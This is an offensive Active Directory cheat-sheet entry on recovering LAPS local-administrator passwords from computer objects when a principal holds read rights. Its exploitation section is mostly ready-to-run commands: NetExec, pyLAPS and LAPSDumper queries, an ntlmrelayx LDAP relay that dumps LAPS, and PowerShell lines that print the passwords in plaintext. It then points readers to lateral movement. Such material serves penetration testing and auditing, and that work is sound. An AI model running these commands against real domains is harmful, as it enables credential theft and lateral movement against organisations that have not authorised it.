**Read LAPS password** — LAPS stores each machine's rotated local-administrator password in a directory attribute. LAPSv1 keeps it in cleartext (`ms-Mcs-AdmPwd`); Windows LAPS / LAPSv2 keeps it DPAPI-NG-encrypted (`msLAPS-EncryptedPassword`). A principal granted the read right (BloodHound `ReadLAPSPassword` / `AllExtendedRights` on the computer) recovers that host's local-admin password.

## Discovery

BloodHound `ReadLAPSPassword` edge into a computer, or `AllExtendedRights` on computer objects. Which LAPS is in use is visible from the populated attribute (`ms-Mcs-AdmPwd` vs `msLAPS-*`).

## Exploitation

### From Linux

```bash

# NetExec - recent builds read ms-Mcs-AdmPwd, msLAPS-Password AND msLAPS-EncryptedPassword
nxc ldap 'DC_HOST' -d 'DOMAIN' -u 'USER_NAME' -p 'USER_PASS' -M laps
nxc smb  'TARGET' -d 'DOMAIN' -u 'USER_NAME' -p 'USER_PASS' --laps
# pyLAPS (legacy LAPSv1 ms-Mcs-AdmPwd)
pyLAPS.py --action get -d 'DOMAIN' -u 'USER_NAME' -p 'USER_PASS' --dc-ip 'DC_IP'
# LAPSDumper
laps.py -u 'USER_NAME' -p 'USER_PASS' -d 'DOMAIN'
# via an LDAP relay
ntlmrelayx.py -t ldap://DC_IP --dump-laps

```

### From Windows

```powershell

# Windows LAPS decrypts the encrypted attribute for authorized readers
Get-LAPSADPassword -Identity 'TARGET$' -AsPlainText
# LAPSv1
Get-ADComputer 'TARGET' -Properties 'ms-Mcs-AdmPwd' | select -ExpandProperty 'ms-Mcs-AdmPwd'

```

Use the recovered local-admin password/hash - see [Windows Remote Command Execution](../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).

## Caution

Read-only, but the LAPS password rotates (default 30 days) so the value is short-lived. LAPSv2 encrypted blobs require DPAPI-NG decryption rights (the tools above handle it when your principal is authorized).

## References

- The Hacker Recipes - ReadLAPSPassword - https://www.thehacker.recipes/ad/movement/dacl/readlapspassword
- pyLAPS - https://github.com/p0dalirius/pyLAPS
- NetExec - laps module - https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/laps.py
- HackTricks - LAPS - https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html
